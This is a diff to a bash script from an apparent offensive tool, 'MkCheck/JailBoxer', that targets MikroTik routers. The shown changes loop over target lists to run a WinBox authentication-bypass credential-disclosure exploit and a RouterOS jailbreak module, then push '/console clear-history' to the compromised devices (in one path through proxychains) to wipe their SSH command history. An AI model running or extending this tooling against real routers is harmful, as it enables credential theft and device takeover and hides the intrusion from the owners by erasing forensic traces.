@@ -408,6 +408,17 @@ g255(){
 	#echo -e "${UPURPLE}${Z}.${UBLUE}Next Target is ${YLW}${VAR}${NC}"
 }
 
+#############
+# Final Result LookUp
+############
+
+resultsopt(){
+	RARG=$(python3 scripts/get/res.py)
+	VAR=$(echo ${RARG})
+	mv files/res.txt files/tiks_res.txt
+	sudo mv /opt/MkCheck/results/Vulns/* -t /opt/MkCheck/results/Vulns/${SESSION}
+}
+
 ###############################################
 ###############################################
 #  Final Results Correlation for Net AP Name  #
@@ -419,10 +430,10 @@ apresults(){
   if [[ ${SYQ} == "#" ]]; then
 		echo -e "${W}Please ensure there are no commented out lines\notherwise this check will fail${NC}"
   fi
-  for log in `cat /opt/MkCheck/files/tiks_res.txt`
+  for log in `cat /opt/MkCheck/files/res.txt`
 		do
 			Y=$(( ${Y} + 1 ))
-			IP=$(cat results/Vulns/${SESSION}/${log}.results)
+			IP=$(cat results/Vulns/${log}.results)
 			echo "${log} ${IP}" >> results/Vulns/${SESSION}/final.results
 			echo "==========================================================================="
 			if [[ ${Y} -eq ${Z} ]] || [[ ${Y} -gt ${Z} ]]; then
@@ -700,9 +711,10 @@ bytheway(){
 # WinBox Auth Bypass #
 ######################
 authbox(){
-	for name in `cat /opt/MkCheck/files/tiks_rsf.txt`
+	for name in `cat /opt/MkCheck/files/rsf.txt`
 		do
-			WB=$(sudo python3.7 rsf.py -m exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure -s "target ${name}")
+			echo -e "${RED}Running WinBox Exploit on ${name}${NC}"
+			WB=$(sudo python3 winbox.py ${name})
 			echo "${WB}" >> /opt/MkCheck/results/RSF/${SESSION}/WinBox.${name}
 			echo "${WB}" >> /opt/MkCheck/results/RSF/${SESSION}/WinBox.final
 			echo "${WB}"
@@ -712,7 +724,7 @@ authbox(){
 ####################
 # Jail Break Check #
 jailer(){
-	for name in `cat /opt/MkCheck/files/tiks_rsf.txt`
+	for name in `cat /opt/MkCheck/files/rsf.txt`
 		do
 			JAIL=$(sudo python3 rsf.py -m exploits/routers/mikrotik/routeros_jailbreak -s "target ${name}")
 			echo "${JAIL}" >> /opt/MkCheck/results/RSF/${SESSION}/Jail.${name}
@@ -730,12 +742,12 @@ rtsploit(){
 	#########################################
 	#  winbox_auth_bypass_creds_disclosure  #
 	#########################################
-	xterm -e authbox &
+	xterm -e bash scripts/rtsploit.sh -a &
 	########################
 	########################
 	#  routeros_jailbreak  #
 	########################
-	xterm -e jailer &
+	xterm -e bash scripts/rtsploit.sh -j &
 	echo -e "${ORNG}When both xterm windows are done, please hit ${YLW}enter${NC}"
 	read ENDRSF
 	main
@@ -847,9 +859,18 @@ mrun(){
 	xterm -e bash scripts/thread.sh -5 &
 	echo -e "${ORNG}When all 5 windows are finished scanning, please hit enter${NC}"
 	read ENTEROPT
+	echo ${USER} > temp_user
+	TMP='= "'
+	INP=''
+	sed -i "s/${TMP}/${INP}/g" temp_user
+	TMI='"'
+	TMU=''
+	sed -i "s/${TMI}/${TMU}/g" temp_user
+	USE=$(cat temp_user)
 	echo -e "${YLW}Clearing Target Device SSH History & Sorting Results${NC}"
-	sudo python scripts/clear.py -f /opt/MkCheck/files/tiks.txt -u ${USER} -c '/console clear-history'
+	sudo python scripts/clear.py -f /opt/MkCheck/files/tiks.txt -u ${USE} -c '/console clear-history'
 	sudo rm -rf /opt/MkCheck/logs
+	sudo rm temp_user
 	apresults
 }
 prun(){
@@ -864,9 +885,18 @@ prun(){
 	xterm -e bash scripts/thread.sh -e &
 	echo -e "${ORNG}When all 5 windows are finished scanning, please hit enter${NC}"
 	read ENTEROPT
+	echo ${USER} > temp_user
+	TMP='= "'
+	INP=''
+	sed -i "s/${TMP}/${INP}/g" temp_user
+	TMI='"'
+	TMU=''
+	sed -i "s/${TMI}/${TMU}/g" temp_user
+	USE=$(cat temp_user)
 	echo -e "${YLW}Clearing Target Device SSH History & Sorting Results${NC}"
-	proxychains4 sudo python scripts/clear.py -f /opt/MkCheck/files/tiks.txt -u ${USER} -c '/console clear-history'
+	proxychains4 sudo python scripts/clear.py -f /opt/MkCheck/files/tiks.txt -u ${USE} -c '/console clear-history'
 	sudo rm -rf /opt/MkCheck/logs
+	sudo rm temp_user
 	apresults
 }
 ################################################################################
@@ -878,6 +908,7 @@ main(){
 	session_check
 	MODULE=''
 	echo -e "${BRED}"
+	cd /opt/MkCheck
 	python3 files/banner.py
 	echo -e "${ORNG}Codename: ${LCYN}JailBoxer"
 	echo -e "${ORNG}by ${LCYN}s1l3nt78${NC}"
